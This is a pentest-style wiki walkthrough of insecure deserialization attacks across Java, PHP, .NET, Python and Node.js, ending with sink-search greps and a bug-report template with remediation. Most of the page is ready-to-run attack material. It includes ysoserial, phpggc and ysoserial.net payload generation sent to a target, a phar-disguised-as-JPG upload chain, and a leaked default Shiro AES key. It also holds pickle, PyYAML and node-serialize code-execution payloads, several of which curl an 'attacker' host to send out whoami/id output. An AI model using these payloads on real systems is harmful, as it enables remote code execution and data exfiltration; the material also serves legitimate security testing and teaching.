---
type: wiki
category: attack
tool: ysoserial,phpggc,manual
status: active
last-updated: 2026-04-21
---

# Insecure Deserialization Attack Walkthrough (2026 Edition)

> **Purpose:** Deserialization is a classic P1 (RCE). Although modern frameworks have gradually removed dangerous sinks, older Java (Apache Commons Collections / T3 / Spring AMQP), PHP phar, .NET BinaryFormatter, Python pickle, and Node.js node-serialize remain among the easiest attack surfaces for obtaining RCE.

## 0. Principle

The server receives a **serialized byte string** provided by the user (cookie, header, body, URL param, file upload) and calls a deserialize function to reconstruct the object. If the class has a magic method (`__wakeup`, `readObject`, `finalize`, `ObjectInputStream.resolveClass`) -> arbitrary code execution follows.

**Identifying the serialization format**:

| Format | Leading bytes | Language |
|------|-----------|------|
| `aced0005` | hex | Java `ObjectOutputStream` |
| `H4sIAAAA` (gzip+base64) | base64 | Common Java transport |
| `O:N:"ClassName"` | string | PHP `serialize()` |
| `{"$type":...}` | JSON | .NET `Json.NET TypeNameHandling` |
| `\x80\x04` or `\x80\x03` | binary | Python pickle |
| `_$$ND$$_` prefix | base64 | Node.js `node-serialize` |
| YAML `!!python/object` | text | PyYAML `yaml.load` |

## 1. Detection cheatsheet

### 1.1 Inspecting body / cookie / header for keywords

```bash
# Burp decoder or CyberChef
# Find base64 / hex / query strings and decode the first few bytes
```

### 1.2 Error-based

```
aced0005 payload -> 500 + "ClassNotFoundException"
O:8:"stdClass" -> "unserialize(): Error at offset"
```

An error message leak = you found a deserialize sink.

### 1.3 Sleep gadget (blind testing)

```
Java (CC gadget): ysoserial CommonsCollections5 "sleep 10"
# If the response takes ~10sec -> CC is on the classpath
```

## 2. Java deserialization

### 2.1 ysoserial quick usage

```bash
# Install (pre-built jar available)
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

# List gadget chains
java -jar ysoserial-all.jar

# Generate a payload (command execution)
java -jar ysoserial-all.jar CommonsCollections5 "curl http://attacker/$(whoami)" > payload.bin

# Send to target
curl -X POST https://target.com/api/import \
  --data-binary @payload.bin \
  -H "Content-Type: application/x-java-serialized-object"
```

**Common gadget chain reference**:

| Chain | Dependency | When to use |
|-------|------|--------|
| `CommonsCollections1-7` | Apache Commons Collections | Most common, try first |
| `CommonsBeanutils1` | Apache Commons BeanUtils | Common in Shiro |
| `Spring1/2` | Spring Framework | Spring apps |
| `Hibernate1/2` | Hibernate | JPA apps |
| `Jdk7u21` | JDK 7 only | legacy |
| `URLDNS` | No dependencies, pure DNS callback | **First choice for detection** (no RCE needed, just a DNS out-call) |

### 2.2 URLDNS detection

```bash
java -jar ysoserial-all.jar URLDNS "http://c23abc.oast.live" > payload.bin

curl -X POST https://target.com/api/session \
  --data-binary @payload.bin

# Check interactsh for a DNS hit -> confirms deserialization was triggered
```

**Important**: URLDNS doesn't require any gadget dependency — it purely uses `java.net.URL.hashCode()` to trigger DNS resolution -> the most reliable blind test.

### 2.3 Spring Framework Deserialization

Major Spring RCE CVEs:

| CVE | Impact | Signature |
|-----|------|------|
| CVE-2016-1000027 | Spring AMQP | HttpInvoker, `/invoker` endpoint |
| CVE-2017-8046 | Spring Data REST | PATCH using SpEL |
| CVE-2022-22965 (Spring4Shell) | Spring Core | `class.module.classLoader.resources.context.parent.pipeline.first.pattern=` |

```bash
# Spring4Shell detection
curl "https://target.com/?class.module.classLoader.URLs%5B0%5D=0"
# If 400 Bad Request (internal error message) -> the version may be affected
```

### 2.4 Apache Shiro deserialization (CVE-2016-4437)

Signature: cookie has `rememberMe=`.

```bash
# Tool
git clone https://github.com/feihong-cs/ShiroExploit-Deprecated
# or ShiroAttack2 GUI

# Detect key + gadget
python3 shiro.py -u https://target.com
# Automatically tries 10+ common AES keys + 10+ gadget chains
```

The default key `kPH+bIxk5D2deZiIxcaaaA==` is the most commonly leaked key.

### 2.5 WebLogic T3 / IIOP (uncommon but devastating when hit)

```bash
pip install weblogic-tools
weblogic-tools --target https://target.com:7001 --check

# Or directly use Nuclei
nuclei -u https://target.com:7001 -tags weblogic,rce
```

## 3. PHP deserialization

### 3.1 PHP serialize() basics

```php
// Vulnerable sink
$obj = unserialize($_COOKIE['data']);

// Attacker sends O:8:"ClassName":1:{s:3:"cmd";s:2:"id";}
// If __wakeup / __destruct calls exec($this->cmd) -> RCE
```

### 3.2 phpggc (PHP gadget chain generator)

```bash
git clone https://github.com/ambionics/phpggc
cd phpggc

# List all chains
./phpggc -l

# Common ones:
# Laravel/RCE1, Laravel/RCE9 (5.4-9.x)
# Symfony/FW1, Symfony/RCE5
# Drupal/FW1
# SwiftMailer/FW1
# Yii/RCE2
# WordPress/RCE1

# Generate a payload
./phpggc Laravel/RCE9 system "id" -b
# -b = base64

# Send to target
curl -b "PHPSESSID=$(./phpggc Laravel/RCE9 system 'id' -b)" https://target.com/
```

### 3.3 Phar deserialization (file operation -> RCE)

```php
// Vulnerable sink: file_exists/file_get_contents/filemtime or any filesystem function
// If the path starts with phar://, PHP automatically unserializes the phar's metadata

file_exists($_GET['file']);
// $_GET[file] = phar://uploaded.jpg/x -> triggers deserialization
```

**Generating a phar payload**:

```bash
./phpggc Monolog/RCE1 system "id" -pf  # -p phar, -f fake JPG
# Produces phar.phar, disguised as a JPG file type

# Upload (most upload endpoints accept JPGs)
curl -F "file=@phar.phar;filename=x.jpg" https://target.com/upload

# Trigger (any filesystem op on the uploaded file)
curl "https://target.com/view?file=phar:///var/www/uploads/x.jpg"
```

### 3.4 Manually constructing a PHP POP chain

Find classes with `__wakeup` / `__destruct` / `__toString` / `__call` that use attacker-controlled properties.

```bash
# semgrep
semgrep --config=p/php --include='*.php' .
# or phpstan / snyk code / sonarqube
```

Manually auditing Composer vendored libraries can also turn up 0day chains.

## 4. .NET deserialization

### 4.1 BinaryFormatter (most dangerous)

```csharp
BinaryFormatter bf = new BinaryFormatter();
object obj = bf.Deserialize(stream);  // VULN
```

Deprecated in .NET 5+ but still used in legacy codebases.

### 4.2 Json.NET TypeNameHandling=All

```json
{
  "$type": "System.IO.FileInfo, System.IO.FileSystem",
  "fileName": "C:\\Windows\\Temp\\x.txt"
}
```

When `TypeNameHandling = TypeNameHandling.All` is set, an arbitrary type can be specified -> combined with a gadget -> RCE.

### 4.3 ysoserial.net

```bash
# On Windows:
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c calc"

# Supported formatters:
# BinaryFormatter / NetDataContractSerializer /
# SoapFormatter / ObjectStateFormatter /
# Json.Net / LosFormatter / DataContractSerializer /
# XmlSerializer
```

### 4.4 ViewState deserialization (ASP.NET)

```
__VIEWSTATE=<base64>
```

If the machineKey is leaked (web.config), a malicious ViewState can be constructed to achieve RCE.

```bash
ysoserial.net -p ViewState -g TextFormattingRunProperties \
  -c "calc" --path="/default.aspx" \
  --apppath="/" --decryptionalg="AES" --decryptionkey="..." \
  --validationalg="SHA1" --validationkey="..."
```

## 5. Python deserialization

### 5.1 pickle (inherently dangerous)

```python
# Vulnerable sink
pickle.loads(request.cookies['data'])

# Payload
import pickle, os, base64
class E:
  def __reduce__(self):
    return (os.system, ('curl attacker/$(whoami)',))

print(base64.b64encode(pickle.dumps(E())))
```

### 5.2 yaml.load (PyYAML < 5.1)

```yaml
!!python/object/apply:os.system ["curl attacker/x"]
```

PyYAML 5.1+ defaults to `safe_load`, but older apps still use `yaml.load(data)`.

### 5.3 jsonpickle / dill / shelve

All of these are just as unsafe as pickle.

## 6. Node.js deserialization

### 6.1 node-serialize IIFE injection

```js
// VULN
const serialize = require('node-serialize');
serialize.unserialize(userInput);  // the _$$ND_FUNC$$_ wrapper triggers eval
```

Payload:

```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl attacker/$(id)',()=>{})}()"}
```

### 6.2 funcster / serialize-javascript

Less commonly used but equally dangerous.

### 6.3 ejs / pug / jade template injection (strictly SSTI, but often triggered via deserialization)

See [18-payload-cheatsheet.md](18-payload-cheatsheet.md) SSTI section.

## 7. Common sinks & how to search for them

### 7.1 Java

```bash
grep -r 'ObjectInputStream\|readObject\|readUnshared\|SerializationUtils.deserialize\|XStream\|XMLDecoder\|SnakeYAML\|Jackson.*enableDefaultTyping' src/
```

### 7.2 PHP

```bash
grep -r 'unserialize\|file_exists\|file_get_contents\|filemtime\|is_file' src/
# phar can be smuggled through any filesystem function
```

### 7.3 .NET

```bash
grep -r 'BinaryFormatter\|NetDataContractSerializer\|ObjectStateFormatter\|SoapFormatter\|LosFormatter\|TypeNameHandling' src/
```

### 7.4 Python

```bash
grep -r 'pickle\.loads\|cPickle\.loads\|yaml\.load(' src/
```

### 7.5 Node.js

```bash
grep -r 'node-serialize\|funcster\|serialize-javascript\|vm\.runIn\|eval(' src/
```

## 8. Full PoC: Java Commons Collections -> RCE

### Step 1: Confirm the serialization format

```bash
# The session_data cookie is base64, decode it
echo 'rO0ABXNyABxj...' | base64 -d | xxd | head -2
# 00000000: aced 0005  -> Java serialization
```

### Step 2: URLDNS blind test

```bash
java -jar ysoserial-all.jar URLDNS "http://c23abc.oast.live" | base64 > payload.txt

curl -b "session_data=$(cat payload.txt)" https://target.com/app/home

# Wait for the interactsh callback -> confirmed
```

### Step 3: Try gadget chains

```bash
for chain in CommonsCollections{1,2,3,4,5,6,7} CommonsBeanutils1 Spring1 Hibernate1; do
  java -jar ysoserial-all.jar $chain "curl http://c23abc.oast.live/$chain" | base64 > /tmp/p_$chain
  curl -b "session_data=$(cat /tmp/p_$chain)" https://target.com/app/home > /dev/null
done

# Check interactsh to see which chain triggered a callback -> that chain works
```

### Step 4: Get a shell (PoC stops at curl whoami)

```bash
java -jar ysoserial-all.jar CommonsCollections5 "curl http://attacker/$(id | base64)" | base64 > exploit.txt
curl -b "session_data=$(cat exploit.txt)" https://target.com/app/home
```

**Important**: The PoC stops at `curl attacker/$(whoami)`. Do not use a reverse shell, do not persist.

## 9. Report template

```markdown
## Vulnerability Summary
The session_data cookie on https://target.com/app/home is deserialized by the server
using a Java ObjectInputStream. Apache Commons Collections 3.x is present on the
classpath, allowing pre-auth RCE via the ysoserial CommonsCollections5 gadget chain.

## Reproduction Steps

### Step 1: Confirm the cookie format
[aced0005 magic bytes]

### Step 2: URLDNS blind test
[java -jar ysoserial URLDNS + DNS callback screenshot]

### Step 3: CC5 chain confirmation
[curl PoC + attacker logs showing whoami output]

## Impact
- Pre-auth remote code execution on the application server
- Server runs as user `tomcat` (uid confirmed via PoC)
- Potential pivot to internal network / data exfiltration

## Severity
P1 / Critical

## Remediation
1. If deserialization is required, use an allowlist (`ObjectInputFilter` in JDK 9+ / SerialKiller)
2. Upgrade Apache Commons Collections to 4.x (InvokerTransformer removed)
3. Switch to JSON (Jackson with no TypeNameHandling) instead of native deserialization
4. Change sessions to server-side storage + opaque tokens
```

## Related Documents

- [18-payload-cheatsheet.md](18-payload-cheatsheet.md) — SSTI section
- [66-ssrf-deep.md](66-ssrf-deep.md) — SSRF -> jar:// trigger
- ysoserial: https://github.com/frohoff/ysoserial
- phpggc: https://github.com/ambionics/phpggc
- ysoserial.net: https://github.com/pwntester/ysoserial.net
- PortSwigger Insecure Deserialization: https://portswigger.net/web-security/deserialization
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
